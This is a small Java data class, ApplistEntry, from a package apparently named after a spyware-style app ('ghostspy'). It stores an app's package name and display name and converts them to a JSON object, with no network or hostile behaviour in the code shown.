package com.spy.ghostspy.model;

import org.json.JSONException;
import org.json.JSONObject;

public class ApplistEntry {
    private final String packagename;
    private final String appname;
    public ApplistEntry(String packagename, String appname) {
        this.packagename = packagename;
        this.appname = appname;
    }
    public JSONObject toJson() {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("packagename", packagename);
            jsonObject.put("appname", appname);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }
}
